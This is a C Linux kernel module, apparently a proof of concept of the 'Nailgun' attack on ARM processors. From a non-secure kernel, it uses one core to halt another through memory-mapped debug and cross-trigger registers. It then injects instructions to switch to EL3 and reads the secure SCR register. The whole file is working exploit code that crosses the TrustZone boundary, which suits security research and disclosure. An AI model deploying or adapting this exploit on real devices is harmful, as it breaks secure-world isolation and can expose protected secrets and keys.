#include <linux/module.h>    // included for all kernel modules
#include <linux/kernel.h>    // included for KERN_INFO
#include <linux/init.h>      // included for __init and __exit macros
#include <asm/io.h>
#include <linux/slab.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Zhenyu Ning");
MODULE_DESCRIPTION("Read SCR by Nailgun attack with a non-secure kernel module");

// 0x40030000 is the base address of the debug registers on Core 0
#define DEBUG_REGISTER_ADDR             0x40030000
#define DEBUG_REGISTER_SIZE             0x1000

// 0x40030000 is the base address of the cross trigger interface registers on Core 0
#define CTI_REGISTER_ADDR               0x40038000
#define CTI_REGISTER_SIZE               0x1000

// Offsets of debug registers
#define DBGDTRRX_OFFSET                 0x80
#define EDITR_OFFSET                    0x84
#define EDSCR_OFFSET                    0x88
#define DBGDTRTX_OFFSET                 0x8C
#define EDRCR_OFFSET                    0x90
#define OSLAR_OFFSET                    0x300
#define EDLAR_OFFSET                    0xFB0

// Bits in EDSCR
#define STATUS                          (0x3f)
#define ERR                             (1 <<  6)
#define HDE				(1 << 14)
#define ITE                             (1 << 24)

// Bits in EDRCR
#define CSE                             (1 <<  2)

// Offsets of cross trigger registers
#define CTICONTROL_OFFSET               0x0
#define CTIINTACK_OFFSET                0x10
#define CTIAPPPULSE_OFFSET              0x1C
#define CTIOUTEN0_OFFSET                0xA0
#define CTIOUTEN1_OFFSET                0xA4
#define CTITRIGOUTSTATUS_OFFSET         0x134
#define CTIGATE_OFFSET                  0x140

// Bits in CTICONTROL
#define GLBEN                           (1 <<  0)

// Bits in CTIINTACK
#define ACK0                            (1 <<  0)
#define ACK1                            (1 <<  1)

// Bits in CTIAPPPULSE
#define APPPULSE0                       (1 <<  0)
#define APPPULSE1                       (1 <<  1)

// Bits in CTIOUTEN<n>
#define OUTEN0                          (1 <<  0)
#define OUTEN1                          (1 <<  1)

// Bits in CTITRIGOUTSTATUS
#define TROUT0                          (1 <<  0)
#define TROUT1                          (1 <<  1)

// Bits in CTIGATE
#define GATE0                           (1 <<  0)
#define GATE1                           (1 <<  1)

// Values of EDSCR.STATUS
#define NON_DEBUG                       0x2
#define HLT_BY_DEBUG_REQUEST            0x13

struct nailgun_param {
    void __iomem *debug_register;
    void __iomem *cti_register;
} t_param;

static void execute_ins_via_itr(void __iomem *debug, uint32_t ins) {
    uint32_t reg;
    // clear previous errors 
    iowrite32(CSE, debug + EDRCR_OFFSET);

    // Write instruction to EDITR register to execute it
    iowrite32(ins, debug + EDITR_OFFSET);

    // Wait until the execution is finished
    reg = ioread32(debug + EDSCR_OFFSET);
    while ((reg & ITE) != ITE) {
        reg = ioread32(debug + EDSCR_OFFSET);
    }

    if ((reg & ERR) == ERR) {
        printk(KERN_ERR "%s failed! instruction: 0x%08x EDSCR: 0x%08x\n", 
            __func__, ins, reg);  
    }
}

static uint32_t save_register(void __iomem *debug, uint32_t ins) {
    // Execute the ins to copy the target register to R0
    execute_ins_via_itr(debug, ins);
    // Copy R0 to the DCC register DBGDTRTX
    // 0xee000e15 <=> mcr p14, 0, R0, c0, c5, 0
    execute_ins_via_itr(debug, 0x0e15ee00);
    // Read the DBGDTRTX via the memory mapped interface
    return ioread32(debug + DBGDTRTX_OFFSET);
}

static void restore_register(void __iomem *debug, uint32_t ins, uint32_t val) {
    // Copy value to the DBGDTRRX via the memory mapped interface
    iowrite32(val, debug + DBGDTRRX_OFFSET);
    // Copy the DCC register DBGDTRRX to R0
    // 0xee100e15 <=> mrc p14, 0, R0, c0, c5, 0
    execute_ins_via_itr(debug, 0x0e15ee10);
    // Execute the ins to copy R0 to the target register
    execute_ins_via_itr(debug, ins);
}

static void read_scr(void *addr) {
    uint32_t reg, r0_old, dlr_old, scr;
    struct nailgun_param *param = (struct nailgun_param *)addr;

    // Step 1: Unlock debug and cross trigger reigsters
    printk(KERN_INFO "Step 1: Unlock debug and cross trigger registers\n");
    iowrite32(0xc5acce55, param->debug_register + EDLAR_OFFSET);
    iowrite32(0xc5acce55, param->cti_register + EDLAR_OFFSET);
    iowrite32(0x0, param->debug_register + OSLAR_OFFSET);
    iowrite32(0x0, param->cti_register + OSLAR_OFFSET);

    // Step 2: Enable halting debug on the target processor
    printk(KERN_INFO "Step 2: Enable halting debug\n");
    reg = ioread32(param->debug_register + EDSCR_OFFSET);
    reg |= HDE;
    iowrite32(reg, param->debug_register + EDSCR_OFFSET);

    // Step 3: Send halt request to the target processor
    printk(KERN_INFO "Step 3: Halt the target processor\n");
    iowrite32(GLBEN, param->cti_register + CTICONTROL_OFFSET);
    reg = ioread32(param->cti_register + CTIGATE_OFFSET);
    reg &= ~GATE0;
    iowrite32(reg, param->cti_register + CTIGATE_OFFSET);
    reg = ioread32(param->cti_register + CTIOUTEN0_OFFSET);
    reg |= OUTEN0;
    iowrite32(reg, param->cti_register + CTIOUTEN0_OFFSET);
    reg = ioread32(param->cti_register + CTIAPPPULSE_OFFSET);
    reg |= APPPULSE0;
    iowrite32(reg, param->cti_register + CTIAPPPULSE_OFFSET);

    // Step 4: Wait the target processor to halt
    printk(KERN_INFO "Step 4: Wait the target processor to halt\n");
    reg = ioread32(param->debug_register + EDSCR_OFFSET);
    while ((reg & STATUS) != HLT_BY_DEBUG_REQUEST) {
        reg = ioread32(param->debug_register + EDSCR_OFFSET);
    }
    reg = ioread32(param->cti_register + CTIINTACK_OFFSET);
    reg |= ACK0;
    iowrite32(reg, param->cti_register + CTIINTACK_OFFSET);
    reg = ioread32(param->cti_register + CTITRIGOUTSTATUS_OFFSET);
    while ((reg & TROUT0) == TROUT0) {
        reg = ioread32(param->cti_register + CTITRIGOUTSTATUS_OFFSET);
    }

    // Step 5: Save context of the target core
    printk(KERN_INFO "Step 5: Save context\n");
    // 0xee000e15 <=> mcr p14, 0, R0, c0, c5, 0
    execute_ins_via_itr(param->debug_register, 0x0e15ee00);
    r0_old = ioread32(param->debug_register + DBGDTRTX_OFFSET);
    // 0xee740f35 <=> mrc p15, 3, R0, c4, c5, 1
    dlr_old = save_register(param->debug_register, 0x0f35ee74);

    // Step 6: Switch to EL3 to access secure resource
    printk(KERN_INFO "Step 6: Switch to EL3\n");
    // 0xf78f8003 <=> dcps3
    execute_ins_via_itr(param->debug_register, 0x8003f78f);

    // Step 7: Read the SCR
    printk(KERN_INFO "Step 7: Read SCR\n");
    // 0xee110f11 <=> mrc p15, 0, R0, c1, c1, 0
    execute_ins_via_itr(param->debug_register, 0x0f11ee11);
    // 0xee000e15 <=> mcr p14, 0, R0, c0, c5, 0
    execute_ins_via_itr(param->debug_register, 0x0e15ee00);
    scr = ioread32(param->debug_register + DBGDTRTX_OFFSET);

    // Step 8: Restore context
    printk(KERN_INFO "Step 8: Restore context\n");
    // 0x0f35ee64 <=> mcr p15, 3, R0, c4, c5, 1
    restore_register(param->debug_register, 0x0f35ee64, dlr_old);
    iowrite32(r0_old, param->debug_register + DBGDTRRX_OFFSET);
    // 0xee100e15 <=> mrc p14, 0, R0, c0, c5, 0
    execute_ins_via_itr(param->debug_register, 0x0e15ee10);

    // Step 9: Send restart request to the target processor
    printk(KERN_INFO "Step 9: Send restart request to the target processor\n");
    reg = ioread32(param->cti_register + CTIGATE_OFFSET);
    reg &= ~GATE1;
    iowrite32(reg, param->cti_register + CTIGATE_OFFSET);
    reg = ioread32(param->cti_register + CTIOUTEN1_OFFSET);
    reg |= OUTEN1;
    iowrite32(reg, param->cti_register + CTIOUTEN1_OFFSET);
    reg = ioread32(param->cti_register + CTIAPPPULSE_OFFSET);
    reg |= APPPULSE1;
    iowrite32(reg, param->cti_register + CTIAPPPULSE_OFFSET);

    // Step 10: Wait the target processor to restart
    printk(KERN_INFO "Step 10: Wait the target processor to restart\n");
    reg = ioread32(param->debug_register + EDSCR_OFFSET);
     while ((reg & STATUS) != NON_DEBUG) {
        reg = ioread32(param->debug_register + EDSCR_OFFSET);
    }
    reg = ioread32(param->cti_register + CTIINTACK_OFFSET);
    reg |= ACK1;
    iowrite32(reg, param->cti_register + CTIINTACK_OFFSET);
    reg = ioread32(param->cti_register + CTITRIGOUTSTATUS_OFFSET);
    while ((reg & TROUT1) == TROUT1) {
        reg = ioread32(param->cti_register + CTITRIGOUTSTATUS_OFFSET);
    }

    printk(KERN_INFO "All done! The value of SCR is 0x%08x\n", scr);
}

static int __init nailgun_init(void) {
    struct nailgun_param *param = kmalloc(sizeof(t_param), GFP_KERNEL);
    
    // Mapping the debug and cross trigger registers into virtual memory space 
    param->debug_register = ioremap(DEBUG_REGISTER_ADDR, DEBUG_REGISTER_SIZE);
    param->cti_register = ioremap(CTI_REGISTER_ADDR, CTI_REGISTER_SIZE);
    // We use the Core 1 to read the SCR via debugging Core 0
    smp_call_function_single(1, read_scr, param, 1);
    iounmap(param->cti_register);
    iounmap(param->debug_register);

    kfree(param);
    return 0;
}

static void __exit nailgun_exit(void) {
    printk(KERN_INFO "Goodbye!\n");
}
module_init(nailgun_init);
module_exit(nailgun_exit);